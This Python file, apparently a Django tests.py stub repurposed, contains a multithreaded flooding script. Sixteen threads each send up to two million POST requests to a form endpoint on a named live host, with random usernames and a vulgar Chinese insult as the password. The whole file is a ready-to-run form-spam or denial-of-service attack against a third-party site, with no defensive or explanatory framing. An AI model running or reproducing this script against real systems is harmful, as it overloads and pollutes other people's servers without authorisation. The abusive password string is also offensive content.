# from django.test import TestCase

# Create your tests here.
import os
# import django
# os.environ.setdefault("DJANGO_SETTINGS_MODULE", "diary.settings")
# django.setup()
import requests
import random
import json
import threading

url = 'http://rafgj.icu/plus/diy.php'

data = {
    'user': 123456,
    'pass': 1231,
    'action': 'post',
    'do': 4,
    'diyid': 4
}


def a(name):
    for _ in range(2000000):
        data['user'] = random.randint(0, 123132)
        data['pass'] = "caonimade？？"
        p = requests.post(url, data=data)
        if _ % 100 == 0:
            print("线程%s第%s次" % (name, _), json.loads(p.content))
        # time.sleep(0.1)


class MyThread (threading.Thread):
    def __init__(self, thread_id):
        threading.Thread.__init__(self)
        self.threadID = thread_id

    def run(self):
        print("开始线程：" + self.name)
        a(self.threadID)
        print("退出线程：" + self.name)


threds = []
for i in range(16):
    t = MyThread("Thread-%d" % i)
    t.start()
    threds.append(t)

for t in threds:
    t.join()
